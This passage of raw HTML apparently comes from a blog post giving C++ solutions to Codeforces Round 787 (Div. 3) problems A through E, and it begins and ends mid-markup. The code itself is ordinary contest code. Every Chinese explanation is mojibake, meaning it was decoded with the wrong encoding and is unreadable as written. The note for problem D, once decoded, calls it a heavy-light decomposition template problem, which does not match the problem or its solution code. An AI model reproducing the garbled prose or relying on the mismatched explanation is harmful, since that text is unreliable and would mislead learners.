class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line">    <span class="keyword">int</span> num[<span class="number">5</span>];</span><br><span class="line">    cin&gt;&gt;num[<span class="number">1</span>]&gt;&gt;num[<span class="number">2</span>]&gt;&gt;num[<span class="number">3</span>]&gt;&gt;x&gt;&gt;y;</span><br><span class="line">    num[<span class="number">3</span>]-=<span class="built_in">max</span>(<span class="number">0</span>,x-num[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span>(num[<span class="number">3</span>]&lt;<span class="number">0</span>)<span class="function">NO</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">    <span class="title">if</span><span class="params">(num[<span class="number">2</span>]+num[<span class="number">3</span>]&gt;=y)</span></span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Make-It-Increasing"><a href="#B-Make-It-Increasing" class="headerlink" title="B. Make It Increasing"></a>B. Make It Increasing</h2><h3 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/06/Codeforces%20Round%20787(Div.3)/2.png" alt="2"></p><h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>ç»™ä½ ä¸€ä¸ªæ•°ç»„ï¼Œä¸€æ¬¡æ“ä½œå¯ä»¥è®©å®ƒæ•´é™¤2ï¼Œé—®æœ€åèƒ½é€šè¿‡æœ€å°‘å¤šå°‘æ¬¡æ“ä½œè®©åºåˆ—ä¸¥æ ¼é€’å¢ã€‚å› ä¸ºæ“ä½œåªä¼šä½¿å¾—æ•°å­—å˜å°ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸éš¾å¾—åˆ°ï¼Œå¦‚æœè¦è®©å®ƒæ“ä½œæ¬¡æ•°æœ€å°ï¼Œæœ€åä¸€ä¸ªæ•°ä¸èƒ½åŠ¨ã€‚ç„¶åä¾æ¬¡å¾€å‰ï¼Œå¦‚æœå‰é¢çš„æ¯”åé¢çš„å¤§é‚£å°±è¿›è¡Œä¸€æ¬¡æ“ä½œï¼Œç›´åˆ° <code>a[i]&lt;a[i-1]||a[i]==0</code> å› ä¸ºåˆ°0äº†æ•´é™¤å°±ä¸ä¼šå˜äº†ï¼Œå› æ­¤è¿™ä¸ªæ¡ä»¶éœ€è¦åŠ ä¸Šå»ã€‚</p><p>æœ€ååªéœ€è¦åˆ¤æ–­ç¬¬ä¸€ä¸ªæ•°å’Œç¬¬äºŒä¸ªæ•°æ˜¯å¦éƒ½ä¸º0å³å¯ã€‚</p><h3 id="æ ‡ç¨‹-1"><a href="#æ ‡ç¨‹-1" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">1</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">while</span>(a[i]&gt;=a[i+<span class="number">1</span>]&amp;&amp;a[i])&#123;</span><br><span class="line">            a[i]/=<span class="number">2</span>;</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(a[<span class="number">1</span>]==<span class="number">0</span>&amp;&amp;a[<span class="number">2</span>]==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;-1&quot;</span>);    </span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,cnt);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Detective-Task"><a href="#C-Detective-Task" class="headerlink" title="C. Detective Task"></a>C. Detective Task</h2><h3 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/06/Codeforces%20Round%20787(Div.3)/3.png" alt="3"></p><h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>ä¸€å¼€å§‹è¿˜ä»¥ä¸ºæ˜¯é€»è¾‘æ¨ç†é¢˜ï¼Œæ­£é¢æ€è€ƒæ— æœä¹‹åå‘ç°ä¸€ç‚¹ï¼šå½“ä¸€ä¸ªäººæ˜¯å°å·çš„æ—¶å€™ï¼Œè¿™ä¸ªäººå‰é¢å…¨ä¸º1æˆ–è€…?ï¼Œåé¢å…¨ä¸º0æˆ–è€…?å½“éå†ç¬¬ i ä¸ªäººçš„æ—¶å€™ï¼Œ<code>cnt(?|1)=i-1 cnt(?|0)=n-i</code></p><p>å¦‚æœè¦åˆ¤æ–­è¿™ä¸ªäººæ˜¯ä¸æ˜¯å°å·ï¼Œåªéœ€è¦çœ‹å…¶ä»–äººè¯´çš„å…¨ä¸ºçœŸè¯æ—¶ï¼Œ èƒ½å¦è¯æ˜å®ƒæ˜¯å°å·ï¼Œå› æ­¤æˆ‘å°±ä¸ç”¨ç®¡å®ƒè¯´äº†ä»€ä¹ˆï¼Œç›´æ¥æ»šåŠ¨è¿‡å»åˆ¤æ–­å°±å¥½äº†ã€‚</p><h3 id="æ ‡ç¨‹-2"><a href="#æ ‡ç¨‹-2" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    s[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(s+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> cnt1=<span class="number">0</span>,cnt0=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">&#x27;?&#x27;</span>||s[i]==<span class="string">&#x27;0&#x27;</span>)cnt0++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">&#x27;?&#x27;</span>||s[i]==<span class="string">&#x27;0&#x27;</span>)&#123;</span><br><span class="line">            cnt0--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(s[i<span class="number">-1</span>]==<span class="string">&#x27;?&#x27;</span>||s[i<span class="number">-1</span>]==<span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">            cnt1++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(cnt0==len-i&amp;&amp;cnt1==i<span class="number">-1</span>)&#123;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-Insert-a-Progression"><a href="#D-Insert-a-Progression" class="headerlink" title="D. Insert a Progression"></a>D. Insert a Progression</h2><h3 id="é¢˜ç›®æè¿°-3"><a href="#é¢˜ç›®æè¿°-3" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/06/Codeforces%20Round%20787(Div.3)/4.png" alt="4"></p><h3 id="é¢˜ç›®åˆ†æ-3"><a href="#é¢˜ç›®åˆ†æ-3" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>æ ‘é“¾å‰–åˆ†æ¿é¢˜ï¼Œè€Œä¸”åªè¦è½»é‡é“¾å‰–åˆ†å®Œäº†å°±å¯ä»¥ç›´æ¥è¾“å‡ºäº†ã€‚</p><h3 id="æ ‡ç¨‹-3"><a href="#æ ‡ç¨‹-3" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">200005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,x;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;x;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> max_x=a[<span class="number">1</span>],min_x=a[<span class="number">1</span>],ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        ans+=<span class="built_in">abs</span>(a[i]-a[i<span class="number">-1</span>]);</span><br><span class="line">        max_x=<span class="built_in">max</span>(max_x,a[i]);</span><br><span class="line">        min_x=<span class="built_in">min</span>(min_x,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    ans+=<span class="built_in">min</span>((min_x<span class="number">-1</span>)*<span class="number">2</span>,<span class="built_in">min</span>(<span class="built_in">abs</span>(a[<span class="number">1</span>]<span class="number">-1</span>),<span class="built_in">abs</span>(a[n]<span class="number">-1</span>)));</span><br><span class="line">    <span class="keyword">if</span>(x&gt;max_x)&#123;</span><br><span class="line">        ans+=<span class="built_in">min</span>((x-max_x)*<span class="number">2</span>,<span class="built_in">min</span>(<span class="built_in">abs</span>(x-a[<span class="number">1</span>]),<span class="built_in">abs</span>(x-a[n])));</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="E-Replace-With-the-Previous-Minimize"><a href="#E-Replace-With-the-Previous-Minimize" class="headerlink" title="E. Replace With the Previous, Minimize"></a>E. Replace With the Previous, Minimize</h2><h3 id="é¢˜ç›®æè¿°-4"><a href="#é¢˜ç›®æè¿°-4" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/06/Codeforces%20Round%20787(Div.3)/5.png" alt="5"></p><h3 id="é¢˜ç›®åˆ†æ-4"><a href="#é¢˜ç›®åˆ†æ-4" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿™é¢˜æœ‰ç‚¹å°æ„æ€ï¼Œæ„æ€å°±æ˜¯ä¸€æ¬¡æ“ä½œèƒ½æŠŠä¸€ä¸ªå­—ç¬¦ä¸²çš„æ‰€æœ‰ç‰¹å®šå­—ç¬¦å˜å° <code>1</code>ï¼Œé—®ä½  <code>k</code> æ¬¡æ“ä½œç”Ÿæˆçš„å­—å…¸åºæœ€å°çš„å­—ç¬¦ä¸²æ˜¯ä»€ä¹ˆã€‚é¦–å…ˆæœ‰ä¸€ç‚¹è‚¯å®šæ²¡é”™ï¼Œå°±æ˜¯æˆ‘æ— è„‘æŠŠå‰é¢ä¸æ˜¯ <code>a</code> çš„å­—ç¬¦å…ˆéƒ½å˜ <code>a</code> äº†è‚¯å®šä¸ä¼šæœ‰é—®é¢˜ã€‚ä½†æ˜¯æœ‰ä¸€ç‚¹éœ€è¦è€ƒè™‘ï¼Œé‚£å°±æ˜¯å…ˆå˜å‰é¢ï¼Œå¦‚æœåé¢è¿˜æœ‰æ¯”è¿™ä¸ªå¤§ä¸€ç‚¹çš„ï¼Œé‚£å°±åˆéœ€è¦å¾ˆå¤šæ¬¡æ‰èƒ½å˜æˆ <code>a</code> äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯æ”¶é›†æ‰€æœ‰èƒ½åœ¨ <code>k</code> æ¬¡èŒƒå›´å†…å˜æˆ <code>a</code> çš„å­—ç¬¦ï¼Œä»å·¦åˆ°å³éå†ï¼Œæ˜¾è€Œæ˜“è§ï¼Œk&gt;=25åˆ™ä¸€å®šå¯ä»¥è¾¾åˆ°å…¨ <code>a</code> çš„çŠ¶æ€ã€‚é‡åˆ°äº†ä¸èƒ½åœ¨ <code>k</code> æ¬¡å˜æˆ <code>a</code> çš„å­—ç¬¦ä¹‹åï¼ŒæŠŠå‰é¢å–å¾—çš„æœ€å¤§æ¬¡æ•°å…ˆç”¨æ‰ï¼Œå¦‚æœæ¬¡æ•°æœ‰å‰©ä½™ï¼Œæ— è„‘ç»™é‚£ä¸€ä¸ªå­—ç¬¦å³å¯ã€‚</p><h3 id="æ ‡ç¨‹-4"><a href="#æ ‡ç¨‹-4" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,k;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change</span><span class="params">(<span class="keyword">char</span> ch)</span></span>&#123;</span><br><span class="line">    <span class="comment">//putchar(ch);putchar(10);</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==ch)s[i]--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;%s\n&quot;,s);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="keyword">if</span>(k&gt;=<span class="number">25</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="built_in">putchar</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> q=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> flag=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]-<span class="string">&#x27;a&#x27;</span>&gt;k)&#123;</span><br><span class="line">            <span class="keyword">int</span> th=k-q;</span><br><span class="line">            <span class="keyword">char</span> cc=s[i];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;th;j++)&#123;</span><br><span class="line">                <span class="comment">//printf(&quot;%d &quot;,j);</span></span><br><span class="line">                <span class="comment">//putchar(cc-j);</span></span><br><span class="line">                <span class="built_in">change</span>(cc-j);</span><br><span class="line">                <span class="comment">//putchar(s[i]-j);putchar(10);</span></span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=q;j&gt;=<span class="number">1</span>;j--)&#123;</span><br><span class="line">                <span class="built_in">change</span>(<span class="string">&#x27;a&#x27;</span>+j);</span><br><span class="line">            &#125;</span><br><span class="line">            flag=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        q=<span class="built_in">max</span>(q,s[i]-<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        <span class="comment">//printf(&quot;%d\n&quot;,q);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="built_in">putchar</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,s);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span 